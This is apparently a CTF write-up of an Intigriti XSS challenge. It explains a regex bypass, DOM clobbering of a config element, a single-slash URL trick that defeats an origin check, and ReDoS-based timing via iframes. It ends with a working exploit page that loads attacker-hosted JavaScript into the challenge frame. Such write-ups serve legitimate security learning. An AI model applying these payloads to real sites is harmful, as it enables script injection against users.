---
title: "Intigriti January Challenge 0525"
date: 2024-05-14 05:05:00 +0530
author: piyush
image: /assets/img/posts/intichall/inti.png
categories: [CTF, XSS]
tags: [ctf, xss, initigriti]
---

I really enjoyed solving this month's CTF [challenge](https://challenge-0525.intigriti.io/) hosted by [@Intigriti](https://x.com/intigriti) and crafted by [joaxcar](https://bsky.app/profile/joaxcar.bsky.social). It took me around 6 hours to solve the challenge. 

Let's get straight to the point. So this was the whole thing that we have to pop an XSS on:

```js
// utils
function safeURL(url){
 let normalizedURL = new URL(url, location)
 return normalizedURL.origin === location.origin
}

function addDynamicScript() {
    const src = window.CONFIG_SRC?.dataset["url"] || location.origin + "/confetti.js"
    if(safeURL(src)){
        const script = document.createElement('script');
        script.src = new URL(src);
        document.head.appendChild(script);
    }
}

// main
(function(){
    const params = new URLSearchParams(window.location.search);
    const name = params.get('name');

    if (name && name.match(/([a-zA-Z0-9]+|\s)+$/)) {
        const messageDiv = document.getElementById('message');
        const spinner = document.createElement('div');
        spinner.classList.add('spinner');
        messageDiv.appendChild(spinner);

        fetch(`/message?name=${encodeURIComponent(name)}`)
        .then(response => response.text())
        .then(data => {
            spinner.remove();
            messageDiv.innerHTML = DOMPurify.sanitize(data);
        })
        .catch(err => {
            spinner.remove();
            messageDiv.innerHTML = "Error fetching message.";
            console.error('Error fetching message:', err);
        });
        
    } else if(name) {
        const messageDiv = document.getElementById('message');
        messageDiv.innerHTML = "Error when parsing name";
    }

    // Load some non-misison-critical content
    requestIdleCallback(addDynamicScript);
})();
```

At first glance, it appeared to be quite tough and secure—with origin validation and the OG DOMPurify, it seemed nearly impossible to bypass. However, once I began examining the code line by line, the very first detail that caught my eye was this:

```js
const src = window.CONFIG_SRC?.dataset["url"] || location.origin + "/confetti.js"
```

This part looked suspicious, and I quickly realized that I'd need to use DOM clobbering to define `CONFIG_SRC`. Initially, I tried injecting HTML elements, but those attempts failed due to the regex filter. However, upon a closer look, I noticed the regex could be bypassed—it lacked the `^` anchor, meaning it didn’t enforce checks from the start of the input. For example, a string like `</strong> Some text` would pass because the regex only validates from where it starts to "make sense." Once I successfully bypassed the regex, I was excited to start injecting elements into the DOM. To clobber `CONFIG_SRC`, I added a `div` element with an `id` of `CONFIG_SRC` and a custom data attribute, like this:

```html
<div id='CONFIG_SRC' data-url='https://example.com'>
```

`data-url` was used because js was trying to get the URL from the URL-dataset attribute. I injected the above payload in the url like this and was pretty sure that it's gonna work. But as you guys know that CTF's are designed to challenge your understandings and hence it didn't worked. I tried debugging the code and later found that `window.CONFIG_SRC` is still undefined but the element was present is the DOM, I was like what the heck!! if it's in the DOM then why it isn't working. Then after sometime I noticed the `addDynamicScript` was used a callback to some weird function `requestIdleCallback`, I tried reading about it but trust me there's really not much about it is on the internet. I understood the basic working of it from the MDN Docs that it is used to call a function only when the event loop is not busy and is sitting idle, more specifically it's used to do some non important stuff that you don't want to hinder with the main thread when the even loop is busy rendering and doing some important stuff. I got the idea that it's executing when the fetch request is sent and is waiting for a response. Fetch is asynchronous so it's not on the main thread and the thread is mostly free while Fetch is waiting, and that's why the `addDynamicScript` function is being executed before the Fetch. After banging my head for few hours and I concluded that I somehow have to delay the execution of the `addDynamicScript` by making the main thread busy for sometime. I tried messing up with the regex to maybe do a Redos but didn't worked at that time (more on this later). I thought if I can't delay the execution then I may speed up the Fetch call, and this is where catches comes handy I tried injecting a cache header thought Burp and retried the attack and it worked this time because the Fetch was almost instant. Now the crucial thing was how to cache it, I again banged my head for some time and concluded that this is rabbit hole and I need to find some other way. After trying many ideas I thought of to let the cache thing work by Burp custom header injection and proceed with the next step of the challenge, that was to bypass this origin check done in `safeURL`.

```js
function safeURL(url){
 let normalizedURL = new URL(url, location)
 return normalizedURL.origin === location.origin
}
```

I had any idea that this can be bypassed because of the different implementations of the `URL` constructors in the two functions, I was sure that there must be some discrepancy issue there. I quickly turned up to the devtools and started debugging the values of those variables. After around an hour or so of debugging and fuzzing I was able to bypass it with this payload:

```
https:/example.com/
```

Notice that there's only one `:` used here after `https` and that fools the `URL` constructor into believing that it's any absolute URL and it has to append it to the `window.location`. And then when it check the origin of the both URL's they are same. But when the URL passed as it is without an origin it is forced to parse the URL and fix the `:` issue. Voila!! we bypassed the origin check and a JS file hosted on any domain can serve as our XSS payload and pop and alert. But not this easy, I still had to bypass the `requestIdleCallback` things.

This is the point when I sought some help from hint's posted by Intigriti. But none of them made sense to me at least at that point. I just had an idea from the hint that we have to play with some kind of window isolation stuff or something similar.
```
You are keeping your windows isolated right?
```

Was still not sure what it was pointing to. But then I noticed that the page didn't had any kind of headers or anything to block framing. I thought framing might help, I tried framing it and to make the event loop busy for a while I tried loading some render heavy elements on the page and after some iterations I was successful in pop-ing an alert in Chrome. But from the discord server I had an idea that the main nightmare is pop-ing this in Firefox. I opened the same exploit in Firefox and as expected it didn't worked. So as a side note when I hack or play CTF's there's a general rule I follow rather than just doing random stuff and that is, I first try to get the idea and then implement it and if doesn't works then try finding the root cause, if it something fixable then try to fix it or move to some other idea. So I tried the idea but it didn't worked, I was curious why, I started digging deeper, after a while I concluded that Firefox is running the challenge frame in an separate thread because the parent was on a different origin(This is not this simple and straight forward but for the sake of brevity lets assume that the reason is the cross origin nature of the parent and the child, (more here)[https://hassansin.github.io/shared-event-loop-among-same-origin-windows]). This left me in awe that what now? I tried finding gadgets before on the challenge page and it didn't had anything and form the cross origin parent page I had nothing to influence the other thread.
I tried contacting Johan and he told me that what you are looking for is in the hints. I don't know why but my brain threw me an error message that I saw before when I was messing with the Regex. The error was:
```
Uncaught InternalError: too much recursion
```
This was happening because of the name parameter being too long for the regex to match and ultimately it was making the thread busy, I was sure that I have found the solution and quickly tried implementing it. Again after some iterations I was able to trigger the XSS by framing multiple XSS Redos payload and one frame that contained the XSS payload. 

Here's the dirty code:

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Exploit</title>
  </head>
  <body>
    <iframe
      width="50%"
      height="100%"
      src="https://challenge-0525.intigriti.io/index.html?name=%3C/strong%3E%3Cdiv%20id=CONFIG_SRC%20data-url=%22https:/temp.staticsave.com/6821d52de70e4.js%22%3Ell%3C/div%3Edcsd"
    ></iframe>
    <div class="container"></div>

    <script>
      function renderRedosFrames() {
        var ele = `<iframe
      width="50%"
      height="100%"
      src="https://challenge-0525.intigriti.io/index.html?name=wededwedwedwed25%32%36%25%36%34%25%36%ewdewedwedwedwedwedwedwededw33%25%37%33%25%36%34%25%36%33%25%36%34%25%36%33%25%37%33%25%36%33%25%37%33%25%36%34%25%36%34%25%33%39%25%33%33%25%33%30%25%33%38%25%33%32%25%33%33%25%33%37%25%36%65%25%33%32%25%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%25%33%33%25%33%31%25%33%39%25%33%32%25%32%36%25%35%65%25%32%35%25%35%65%25%32%36%25%32%61%25%32%38%25%32%39%25%32%39%25%32%38%25%32%61%25%32%36%25%35%65%25%32%35%25%32%34%25%32%33%25%34%30%25%32%36%25%36%34%25%36%33%25%37%33%25%36%34%25%36%33%25%36%34%25%36%33%25%37%33%25%36%33%25%37%33%25%36%34%25%36%34%25%33%39%25%33%33%25%33%30%25%33%38%25%33%32%25%33%33%25%33%37%25%36%65%25%33%32%25%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%25%33%33%25%33%31%25%33%39%25%33%32%25%32%36%25%35%65%25%32%35%25%35%65%25%32%36%25%32%61%25%32%38%25%32%39%25%32%39%25%32%38%25%32%61%25%32%36%25%35%65%25%32%35%25%32%34%25%32%33%25%34%30%25%32%36%25%36%34%25%36%33%25%37%33%25%36%34%25%36%33%25%36%34%25%36%33%25%37%33%25%36%33%25%37%33%25%36%34%25%36%34%25%33%39%25%33%33%25%33%30%25%33%38%25%33%32%25%33%33%25%33%37%25%36%65%25%33%32%25%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%25%33%33%25%33%31%25%33%39%25%33%32%25%32%36%25%35%65%25%32%35%25%35%65%25%32%36%25%32%61%25%32%38%25%32%39%25%32%39%25%32%38%25%32%61%25%32%36%25%35%65%25%32%35%25%32%34%25%32%33%25%34%30%25%32%36%25%36%34%25%36%33%25%37%33%25%36%34%25%36%33%25%36%34%25%36%33%25%37%33%25%36%33%25%37%33%25%36%34%25%36%34%25%33%39%25%33%33%25%33%30%25%33%38%25%33%32%25%33%33%25%33%37%25%36%65%25%33%32%25%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%25%33%33%25%33%31%25%33%39%25%33%32%25%32%36%25%35%65%25%32%35%25%35%65%25%32%36%25%32%61%25%32%38%25%32%39%25%32%39%25%32%38%25%32%61%25%32%36%25%35%65%25%32%35%25%32%34%25%32%33%25%34%30%25%32%36%25%36%34%25%36%33%25%37%33%25%36%34%25%36%33%25%36%34%25%36%33%25%37%33%25%36%33%25%37%33%25%36%34%25%36%34%25%33%39%25%33%33%25%33%30%25%33%38%25%33%32%25%33%33%25%33%37%25%36%65%25%33%32%25%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%25%33%33%25%33%31%25%33%39%25%33%32%25%32%36%25%35%65%25%32%35%25%35%65%25%32%36%25%32%61%25%32%38%25%32%39%25%32%39%25%32%38%25%32%61%25%32%36%25%35%65%25%32%35%25%32%34%25%32%33%25%34%30%25%32%36%25%36%34%25%36%33%25%37%33%25%36%34%25%36%33%25%36%34%25%36%33%25%37%33%25%36%33%25%37%33%25%36%34%25%36%34%25%33%39%25%33%33%25%33%30%25%33%38%25%33%32%25%33%33%25%33%37%25%36%65%25%33%32%25%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%25%33%33%25%33%31%25%33%39%25%33%32%25%32%36%25%35%65%25%32%35%25%35%65%25%32%36%25%32%61%25%32%38%25%32%39%25%32%39%25%32%38%25%32%61%25%32%36%25%35%65%25%32%35%25%32%34%25%32%33%25%34%30%25%32%36%25%36%34%25%36%33%25%37%33%25%36%34%25%36%33%25%36%34%25%36%33%25%37%33%25%36%33%25%37%33%25%36%34%25%36%34%25%33%39%25%33%33%25%33%30%25%33%38%25%33%32%25%33%33%25%33%37%25%36%65%25%33%32%25%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%25%33%33%25%33%31%25%33%39%25%33%32%25%32%36%25%35%65%25%32%35%25%35%65%25%32%36%25%32%61%25%32%38%25%32%39%25%32%39%25%32%38%25%32%61%25%32%36%25%35%65%25%32%35%25%32%34%25%32%33%25%34%30%25%32%36%25%36%34%25%36%33%25%37%33%25%36%34%25%36%33%25%36%34%25%36%33%25%37%33%25%36%33%25%37%33%25%36%34%25%36%34%25%33%39%25%33%33%25%33%30%25%33%38%25%33%32%25%33%33%25%33%37%25%36%65%25%33%32%25%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%25%33%33%25%33%31%25%33%39%25%33%32%25%32%36%25%35%65%25%32%35%25%35%65%25%32%36%25%32%61%25%32%38%25%32%39%25%32%39%25%32%38%25%32%61%25%32%36%25%35%65%25%32%35%25%32%34%25%32%33%25%34%30%25%32%36%25%36%34%25%36%33%25%37%33%25%36%34%25%36%33%25%36%34%25%36%33%25%37%33%25%36%33%25%37%33%25%36%34%25%36%34%25%33%39%25%33%33%25%33%30%25%33%38%25%33%32%25%33%33%25%33%37%25%36%65%25%33%32%25%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%25%33%33%25%33%31%25%33%39%25%33%32%25%32%36%25%35%65%25%32%35%25%35%65%25%32%36%25%32%61%25%32%38%25%32%39%25%32%39%25%32%38%25%32%61%25%32%36%25%35%65%25%32%35%25%32%34%25%32%33%25%34%30%25%32%36%25%36%34%25%36%33%25%37%33%25%36%34%25%36%33%25%36%34%25%36%33%25%37%33%25%36%33%25%37%33%25%36%34%25%36%34%25%33%39%25%33%33%25%33%30%25%33%38%25%33%32%25%33%33%25%33%37%25%36%65%25%33%32%25%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%25%33%33%25%33%31%25%33%39%25%33%32%25%32%36%25%35%65%25%32%35%25%35%65%25%32%36%25%32%61%25%32%38%25%32%39%25%32%39%25%32%38%25%32%61%25%32%36%25%35%65%25%32%35%25%32%34%25%32%33%25%34%30%25%32%36%25%36%34%25%36%33%25%37%33%25%36%34%25%36%33%25%36%34%25%36%33%25%37%33%25%36%33%25%37%33%25%36%34%25%36%34%25%33%39%25%33%33%25%33%30%25%33%38%25%33%32%25%33%33%25%33%37%25%36%65%25%33%32%25%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%25%33%33%25%33%31%25%33%39%25%33%32%25%32%36%25%35%65%25%32%35%25%35%65%25%32%36%25%32%61%25%32%38%25%32%39%25%32%39%25%32%38%25%32%61%25%32%36%25%35%65%25%32%35%25%32%34%25%32%33%25%34%30%25%32%36%25%36%34%25%36%33%25%37%33%25%36%34%25%36%33%25%36%34%25%36%33%25%37%33%25%36%33%25%37%33%25%36%34%25%36%34%25%33%39%25%33%33%25%33%30%25%33%38%25%33%32%25%33%33%25%33%37%25%36%65%25%33%32%25%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%25%33%33%25%33%31%25%33%39%25%33%32%25%32%36%25%35%65%25%32%35%25%35%65%25%32%36%25%32%61%25%32%38%25%32%39%25%32%39%25%32%38%25%32%61%25%32%36%25%35%65%25%32%35%25%32%34%25%32%33%25%34%30%25%32%36%25%36%34%25%36%33%25%37%33%25%36%34%25%36%33%25%36%34%25%36%33%25%37%33%25%36%33%25%37%33%25%36%34%25%36%34%25%33%39%25%33%33%25%33%30%25%33%38%25%33%32%25%33%33%25%33%37%25%36%65%25%33%32%25%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%25%33%33%25%33%31%25%33%39%25%33%32%25%32%36%25%35%65%25%32%35%25%35%65%25%32%36%25%32%61%25%32%38%25%32%39%25%32%39%25%32%38%25%32%61%25%32%36%25%35%65%25%32%35%25%32%34%25%32%33%25%34%30%25%32%36%25%36%34%25%36%33%25%37%33%25%36%34%25%36%33%25%36%34%25%36%33%25%37%33%25%36%33%25%37%33%25%36%34%25%36%34%25%33%39%25%33%33%25%33%30%25%33%38%25%33%32%25%33%33%25%33%37%25%36%65%25%33%32%25%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%5%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%5%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%5%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%5%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%5%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%5%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%255%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%5%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%5%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%5%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%5%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%5%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%5%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%5%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%5%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%5%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%5%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%5%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%%33%38%5%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%5%ffsdcdcsdsdcsdcdscdcsccsdcsdcscsdcd9876543456&&name=dcsdcscdsc"
    ></iframe>`;
        var container = document.querySelector(".container");
        container.innerHTML = ele;

        for (var i = 0; i < 5; i++) {
          container.innerHTML += ele;
        }
      }

      // setTimeout(run, 10);
      setTimeout(renderRedosFrames, 50);
    </script>
  </body>
</html>
```